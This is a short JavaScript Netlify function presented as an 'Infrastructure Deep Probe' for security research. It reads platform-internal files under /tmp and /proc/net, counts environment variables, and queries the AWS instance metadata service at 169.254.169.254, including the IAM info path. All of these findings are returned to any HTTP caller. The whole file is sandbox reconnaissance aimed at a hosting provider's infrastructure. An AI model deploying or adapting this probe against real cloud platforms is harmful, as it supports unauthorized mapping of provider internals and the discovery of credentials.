const fs = require('fs');
const http = require('http');

/**
 * Netlify Infrastructure Deep Probe
 * Purpose: Security Research & Architecture Analysis
 */
exports.handler = async (event, context) => {
  const results = {};

  results.identity = {
    uid: process.getuid(),
    gid: process.getgid(),
    nodeVersion: process.version,
    envCount: Object.keys(process.env).length,
    accountTier: event.headers['x-nf-account-tier'] || 'unknown'
  };

  try {
    const target = '/tmp/nf_req_v1';
    if (fs.existsSync(target)) {
      const stat = fs.lstatSync(target);
      results.nf_req_stat = {
        type: stat.isDirectory() ? "DIRECTORY" : "OTHER",
        mode: stat.mode,
      };
      
      if (stat.isDirectory()) {
        results.nf_req_files = fs.readdirSync(target);
        
        results.nf_req_details = {};
        results.nf_req_files.forEach(file => {
            const filePath = `${target}/${file}`;
            const fileStat = fs.lstatSync(filePath);
            if (fileStat.isFile()) {
                results.nf_req_details[file] = fs.readFileSync(filePath, 'utf8').substring(0, 100);
            } else {
                results.nf_req_details[file] = "Sub-directory/Socket";
            }
        });
      }
    } else {
      results.nf_req_stat = "Not Found";
    }
  } catch (e) {
    results.nf_req_error = e.message;
  }
  
  try {
    results.network = {
      tcp: fs.readFileSync('/proc/net/tcp', 'utf8').split('\n').slice(0, 6),
      route: fs.readFileSync('/proc/net/route', 'utf8').split('\n').slice(0, 5)
    };
  } catch (e) {
    results.network = `Error reading net: ${e.message}`;
  }
  
  const probeMetadata = (path) => new Promise((resolve) => {
    const options = {
      hostname: '169.254.169.254',
      path: `/latest/${path}`,
      method: 'GET',
      timeout: 1000
    };

    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => resolve(data));
    });

    req.on('error', (err) => resolve(`Blocked/Error: ${err.message}`));
    req.on('timeout', () => {
      req.destroy();
      resolve("Timeout (Likely Firewalled)");
    });
    req.end();
  });

  results.aws_metadata_probe = {
    base: await probeMetadata('meta-data/'),
    iam_info: await probeMetadata('meta-data/iam/info'),
  };

  console.log('--- START DEEP PROBE REPORT ---');
  console.log(JSON.stringify(results, null, 2));
  console.log('--- END DEEP PROBE REPORT ---');

  return {
    statusCode: 200,
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      status: "Success",
      message: "Deep probe completed. Check results below or in Netlify Logs.",
      data: results
    }, null, 2)
  };
};
